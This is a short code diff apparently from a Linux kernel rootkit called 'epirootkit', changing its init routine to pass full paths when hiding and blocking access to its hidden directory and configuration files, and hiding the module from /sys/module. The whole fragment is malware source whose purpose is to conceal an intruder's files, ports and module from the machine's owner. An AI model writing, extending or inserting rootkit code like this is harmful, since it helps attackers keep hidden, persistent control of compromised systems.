@@ -45,19 +45,24 @@ int init_interceptor(void) {
         return err;
     }
 
+    #define HIDE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_CFG_FILE
+    #define FORBID_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" FORBID_CFG_FILE
+    #define ALTERATE_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" ALTERATE_CFG_FILE
+    #define HIDE_PORT_CFG_FILE_FULL_PATH HIDDEN_DIR_PATH "/" HIDE_PORT_CFG_FILE
+
     // Hide directory HIDDEN_DIR_PATH
     hide_file(HIDDEN_DIR_PATH);
-    hide_file(HIDE_CFG_FILE);
-    hide_file(FORBID_CFG_FILE);
-    hide_file(ALTERATE_CFG_FILE);
-    hide_file(HIDE_PORT_CFG_FILE);
+    hide_file(HIDE_CFG_FILE_FULL_PATH);
+    hide_file(FORBID_CFG_FILE_FULL_PATH);
+    hide_file(ALTERATE_CFG_FILE_FULL_PATH);
+    hide_file(HIDE_PORT_CFG_FILE_FULL_PATH);
 
     // Forbid access to HIDDEN_DIR_PATH
     forbid_file(HIDDEN_DIR_PATH);
-    forbid_file(HIDE_CFG_FILE);
-    forbid_file(FORBID_CFG_FILE);
-    forbid_file(ALTERATE_CFG_FILE);
-    forbid_file(HIDE_PORT_CFG_FILE);
+    forbid_file(HIDE_CFG_FILE_FULL_PATH);
+    forbid_file(FORBID_CFG_FILE_FULL_PATH);
+    forbid_file(ALTERATE_CFG_FILE_FULL_PATH);
+    forbid_file(HIDE_PORT_CFG_FILE_FULL_PATH);
 
     // Hide module in /sys/modules
     hide_file("/sys/module/epirootkit");
